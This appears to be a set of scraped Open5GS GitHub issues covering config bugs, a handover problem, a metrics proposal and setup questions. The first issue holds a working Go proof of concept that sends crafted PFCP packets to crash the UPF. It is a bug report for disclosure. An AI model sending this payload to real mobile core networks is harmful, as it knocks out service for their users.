### UE Models and versions

srsenb_zmq

items.body:
### Open5GS Release, Revision, or Tag

v2.7.2

### Steps to reproduce

Sending a pfcp NewSessionEstablishmentRequest packet with  restoration_indication = true and (teid = 0 or teid > ogs_pfcp_pdr_teid_pool.size) would cause the UPF to reach an assertion in line `1365` of `lib/pfcp/context.c` and crash. The size of ogs_pfcp_pdr_teid_pool is  `max_ue * 4 * 16`. The issue can be reproduced by starting the upf only.

1. start a new go project inside a new folder: `go mod init ogs_poc`
2. create a `main.go` and paste the  code below:
3. download required libraries: `go mod tidy`
4. run the program with the upf pfcp server address: `go run main.go 10.22.77.2` 

 
```go
package main
import (
	"flag"
	"fmt"
	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
	"log"
	"net"
)

func execPayload(host string) error {
	// random ip used as node id address
	var addr = "1.1.1.1"
	addrIp := net.ParseIP(addr)

	// create udp connection to upf
	conn, err := net.Dial("udp", host)
	if err != nil {
		return fmt.Errorf("net.Dial: %v", err)
	}
	defer conn.Close()

	// create NewAssociationSetupRequest
	asReq, _ := message.NewAssociationSetupRequest(
		0, ie.NewNodeID(addr, "", ""),
	).Marshal()

	// create NewSessionEstablishmentRequest
	seReq, _ := message.NewSessionEstablishmentRequest(0, 0, 0x0, 1, 0,
		ie.NewNodeID(addr, "", ""),
		ie.NewFSEID(0x0, addrIp, nil),
		ie.NewCreatePDR(
			ie.NewPDRID(0),
			ie.NewPDI(
				ie.NewSourceInterface(0),
				// (teid = 0 or teid = max_ue*4*16) and pfcpSEReq = 1
				ie.NewFTEID(1, 1024*4*16+1, addrIp, nil, 0),
			)),
		// pfcpSEReq = 1 -> Restoration Indication = Present
		ie.NewPFCPSEReqFlags(1),
	).Marshal()

	// send association setup
	conn.Write(asReq)
	fmt.Printf("sent NewAssociationSetupRequest 0x%x\n", asReq)

	// send session establishment with payload
	conn.Write(seReq)
	fmt.Printf("sent NewSessionEstablishmentRequest 0x%x\n", seReq)

	return nil
}

func main() {

	var (
		port = flag.Int("p", 8805, "upf pfcp port")
	)
	flag.Parse()
	if len(flag.Args()) != 1 {
		log.Fatal("set pfcp upf host")
	}
	host := fmt.Sprintf("%v:%d", flag.Arg(0), *port)

	err := execPayload(host)
	if err != nil {
		log.Fatalf("execPayload: %v", err)
	}
}
```

items.title: TLS and NRF discovery not permitting a port different than 443

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v.2.7.1

### Steps to reproduce

An NF configured for using TLS must register FQDN to the NRF (so that client verification happens based on the FQDN and the CN of the certificate). The standard, as I interpret it, would also allow that under the NFService element the ipEndPoints array appears with the IP addresses and Ports in which each service is available. The scheme parameter decides if its http or https.

Current version of Open5GS does the following:
- The NFs when registering if you want to get the FQDN then they don't include the ipEndPoints with IP address and ports even if you have configured them (the advertise parameter in the sbi  server address section, doesn't seem to help here because instead of adding, it replaces)

According to the code of the NRF, the NRF would return the ipEndPoints in the response to discovery if the NFs had registered them. But I didn't find a way for an NF to send both FQDN and ipEndPoints in the registration.

If there is only FQDN to be discovered, then there is no way to have the NFs configured in a different port than 443 for TLS, because the SCP or NF which is acting as a consumer only has the FQDN to do DNS and find the IP address and then it has to choose the standard por (443 for https scheme).  

Alternatively it would be more interesting if the code would support

Change 1) The NFs when registering to NRF would include both FQDN and ipEndPoints as configured in their yaml file
Change 2)  The SCP or consumer discovering a service via NRF would use FQDN for checking the certificate CN and performing authentication but would use the ipEndPoints content to connect to the service instance


### Logs

_No response_

### Expected behaviour

I would have expected that it would be possible to configure a different port and IP address and that the FQDN is only used for certificate validation if the ipEndPoints element is present

### Observed Behaviour

The NFs only register FQDN or ipEndPoints, never both.  
The NFs use FQDN for DNS resolution of IP address and then assume a default port for the service

items.body:
### Open5GS Release, Revision, or Tag

v2.7.2

### Steps to reproduce

1. Attach two UEs to an ePDG (by enabling WIFI, but putting the UE into flightmode anyway)
2. Establish a VoWIFI call for the two UEs
3. Attach one UE to LTE by going out of flight mode
4. Switch off WIFI on the same UE
5. Watch the handover procedure take place
    5.1 LTE attachment via MME / SGW / PGW from the UE
    5.2 Delete Bearer Request sent from PGW to ePDG
6. Watch any packet sent to the PGW via SGW get dropped with a log indicating IP spoofing


[PGW_reports_ip_spoofing_07_10_2024.zip](https://github.com/user-attachments/files/17277887/PGW_reports_ip_spoofing_07_10_2024.zip)

After successful handover from ePDG to MME, the EPC forwards packets that are associated with the new bearer on the PGW.

BaiCells eNodeB

iPhone (iOS 16.5.1)

items.body: I have open5gs 2.7.0/jammy installed on an Ubuntu 22.04 LTS VM. Everything but SEPP seems to be included in this package. I also see a tar.gz file called v2.7.0.tar.gz on a page that mentions 5G roaming. OK, I downloaded it and untarred/unzipped. A lot of config files in it, and some source code for SEPP, but no clear directions on how to build it. I get it that some users will never want or need to use SEPP, but it is confusing to have something called 'open5gs-2.7.0' installed and it not be included. Any guidance is appreciated. Thank you.

items.title: Metrics monitoring system

labels.name: New Feature
labels.description: New features to implement

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
Hi,

We require having some sort of system which can be used to export metrics to monitor the different open5gs programs.
For instance, we'd like to export the number of active PDP contexts / bearers at the SMF over time.

For that, we'd like to add support for counters into open5gs, adding some sort of generic API for counters, gauges, etc. As a backend/implementation for that API we are planning to use Prometheus [1], which basically requires an HTTP server to be running in the process providing the metrics (open5gs-*).
There already exists a prometheus client lib in C listed in the library list [2], prometheus-client-c [3], which actually contains 2 libraries: libprom and libpromhttp.
Libprom implements the formatting of the counters to be passed to prometheus, and libpromhttp is a really tiny library providing an http server which uses libmicrohpttd underneath. That's great because open5gs already depends on libmicrohttpd, and libmicrohttpd is so tiny that we can actually integrate all that part directly inopen5gs code.

There seems somebody already had the same idea of using libprom in open5gs in the past, so this already provides and insight of how it would look like (it may make more sense to have some generic ogs API wrapper in the middle though imho):
https://github.com/open5gs/open5gs/pull/530

So, I propose something like:

1. Adding some open5gs.git/lib/metrics/ containing a generic way to define counters and operate on them
2. Adding a open5gs.git/lib/metrics/void/ containing a void implementation (empty stubs doing nothing)
3. Adding a open5gs.git/lib/metrics/prometheus/ lib which can be conditionally enabled/disabled at build time, which depends on prometheus-client-c's libprom and libmicrohttpd.
4. Using the new lib in open5gs.git/src/smf/ with a few counters to start with.

[1] https://prometheus.io/
[2] https://prometheus.io/docs/instrumenting/clientlibs/
[3] https://github.com/digitalocean/prometheus-client-c

items.body: ### Open5GS Release, Revision, or Tag v2.6.4 ### Steps to reproduce I am building a setup using the Tutorial [srsRAN gNB with srsUE](https://docs.srsran.com/projects/project/en/latest/tutorials/source/srsUE/source/index.html) and i managed to get the gnb of srsRAN_Project connected to the core of open5gs, but the srsUE of srsRAN4G tries to connect to the core but it gets rejected after **30 seconds**: **Retransmission Failed. Stop Retransmission. Authentication Reject.** I have tried to connect UERANSIM gnb and UE to the core and it worked without problems. I used **the same USIM**, that i already registered in the WEBUI. I changed several times the TX_Gain and RX_Gain but the best result that i've got is this. Setup: 3 PCs Ubuntu 20.04 USRP X310 (gNB) USRP B200mini (UE) UHD 4.4.0.0 [open5gs_core.zip](https://github.com/open5gs/open5gs/files/12645339/open5gs_core.zip) [UE_files.zip](https://github.com/open5gs/open5gs/files/12645340/UE_files.zip) [gnb_files.zip](https://github.com/open5gs/open5gs/files/12645341/gnb_files.zip) ### Logs _No response_ ### Expected behaviour Registration accepted. items.body:
For network setup convinience, in osmo-gsm-tester I am using 1 IP address per object when setting up tests, which means all nodes of an EPC object get 1  unique IP address, and I can configure all open5gs processes to work under the same IP address by configuring different ports to work fine.

I saw most config files can set the "port" together with the "addr", and it's working mostly fine, I have all processes running and connecting each other.

For instance in GTP, I have:
MME = 172.18.50.100:2123
SGWC = 172.18.50.100:2125
SMF = 172.18.50.100:2124

Hence, following config files:
mme.yaml:
```
mme:
    gtpc:
      - addr: ${epc.run_addr} #default port 2123 is used here
sgwc:
    gtpc:
      - addr: ${epc.run_addr}
        port: 2125
smf:
    gtpc:
      - addr: ${epc.run_addr}
        port: 2124
```

sgwc.yaml:
```
sgwc:
    gtpc:
      - addr: ${epc.run_addr}
        port: 2125
```

smf.yaml:
```
smf:
    gtpc:
      - addr: ${epc.run_addr}
        port: 2124
```

However, upon UE attachment, I noticed the following set of messages being sent:
```
MME  ->    SGWC:    Create Session Request
SGWC -> SGWU:    Session Establishment Request
SGWU -> SGWC:    Session Establishment Response
SGWC ->    MME:    Create Session Request
```
And MME then warning about unsupported rx message "Create Session Request". Looking at SGWC code (open5gs.git/src/sgwc/sxa-handler.c sgwc_sxa_handle_session_establishment_response()), that message is aimed at the SMF (interface S5), so clearly something is wrong, since it being sent to the MME (172.18.50.100:2123).

It seems that happens because the port being used in sgwc_sxa_handle_session_establishment_response() is taken from somewhere which is never set, and hence is always 2123. As a result, since the IP address is the same for all nodes, and 2123 was the port MME was listening to, the message is sent to the MME.

After finding that out, I simply did the following changes, and I can have the attachment complete fine with srsUE+srsENB (signalling, didn't get to the user plane setup yet):
```
diff --git a/src/osmo_gsm_tester/templates/open5gs-mmed.yaml.tmpl b/src/osmo_gsm_tester/templates/open5gs-mmed.yaml.tmpl
index 9aec578..d8e23de 100644
--- a/src/osmo_gsm_tester/templates/open5gs-mmed.yaml.tmpl
+++ b/src/osmo_gsm_tester/templates/open5gs-mmed.yaml.tmpl
@@ -146,8 +146,8 @@ sgwc:
 #        apn: volte
 smf:
     gtpc:
-      - addr: ${epc.run_addr}
-        port: 2124
+      - addr: 127.0.0.1
+        port: 2123

 #
 # parameter:
diff --git a/src/osmo_gsm_tester/templates/open5gs-smfd.yaml.tmpl b/src/osmo_gsm_tester/templates/open5gs-smfd.yaml.tmpl
index 0e01337..dfd1092 100644
--- a/src/osmo_gsm_tester/templates/open5gs-smfd.yaml.tmpl
+++ b/src/osmo_gsm_tester/templates/open5gs-smfd.yaml.tmpl
@@ -313,8 +313,8 @@ smf:
       - addr: ${epc.run_addr}
         port: 8808
     gtpc:
-      - addr: ${epc.run_addr}
-        port: 2124
+      - addr: 127.0.0.1
+        port: 2123
     gtpu:
       - addr: ${epc.run_addr}
         port: 2153
```

So as you see, I did temporarily change the IP address, and I can say the IP address is passed correctly. However, the port used by SGWC to connect to SMF is always 2123, despite being able to configure it fine in all nodes.
We do maybe need a new "smf: gtpc: port:" section in sgwc.yaml? That would be really useful to be able to run everything using 1 IP address, or simply to be able to pick any random port number by automated tests.

items.body:

Just wondering if there's any successful config templates shared in public?

And another minor question is, once I changed the servername (FQDN), how to make new certs in /etc/nextepc/freeDiameters/ ?

Thanks and regards.

items.body:
